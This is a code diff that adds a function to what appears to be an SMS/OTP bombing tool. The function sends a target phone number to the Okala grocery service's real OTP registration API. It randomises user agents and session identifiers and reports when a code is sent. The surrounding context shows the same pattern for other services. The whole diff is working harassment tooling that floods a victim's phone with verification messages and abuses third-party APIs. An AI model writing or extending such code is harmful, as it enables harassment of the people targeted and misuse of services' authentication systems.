@@ -64,6 +64,69 @@ def send_service_safe(service, phone):
 # ==========================
 
 
+def Okala(phone):
+    try:
+        url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
+        
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "X-Correlation-Id": str(uuid.uuid4()),
+            "session-id": str(uuid.uuid4()),
+            "ui-version": "2.0",
+            "source": "okala",
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://okala.com",
+            "Referer": "https://okala.com/",
+        }
+        
+        payload = {
+            "mobile": formatted_phone,
+            "confirmTerms": True,
+            "notRobot": False,
+            "ValidationCodeCreateReason": 5,
+            "OtpApp": 0,
+            "deviceTypeCode": 7,
+            "IsAppOnly": False
+        }
+        
+        response = requests.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Okala Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Okala Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("isSuccess") or data.get("otpSent"):
+                    print(f'{g}(Okala) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] Okala Failed: {data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if "success" in response.text.lower() or "otp" in response.text.lower():
+                    print(f'{g}(Okala) Code Sent{a}')
+                    return True
+                return False
+        else:
+            print(f'{r}[-] Okala HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Okala Exception: {e}{a}')
+        return False
+
+
 
 def Besparto(phone):
     try:
